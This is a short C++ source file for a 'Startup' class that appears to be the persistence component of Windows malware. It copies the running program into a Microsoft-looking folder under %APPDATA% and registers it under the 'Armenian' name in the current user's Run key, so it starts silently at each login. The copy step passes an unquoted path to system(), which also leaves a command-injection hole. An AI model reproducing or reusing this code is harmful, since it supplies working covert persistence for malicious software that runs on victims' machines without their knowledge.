#include "Startup.h"

Startup::Startup()
{
    //ctor
}

Startup::~Startup()
{
    //dtor
}

string Startup::GetOurPath(const bool append_separator = false){
	string appdata_dir(getenv("APPDATA"));
	string full = appdata_dir + "\\Microsoft\\CLR";    // backslash = escape character = have 2 to get 1
	return full + (append_separator ? "\\" : "");
}

void Startup::copyFile(char* argv0){
    string cmdToCpyProgram = "copy ";
	cmdToCpyProgram += argv0;
	cmdToCpyProgram += " ";
	cmdToCpyProgram += GetOurPath(true);
	cout<<cmdToCpyProgram.c_str()<<endl;
	system(cmdToCpyProgram.c_str());
}

void Startup::addToRegistry(char* argv0){
    char* exe_name = basename(argv0);
	std::string pathAndEXE = GetOurPath(true) + exe_name;

	HKEY hKey;
	RegOpenKeyExA(
		HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		KEY_WRITE,
		&hKey
	);

	RegSetValueExA(hKey, "Armenian", 0, REG_SZ, (const BYTE*)pathAndEXE.c_str(), pathAndEXE.length() + 1);
	RegCloseKey(hKey);
}
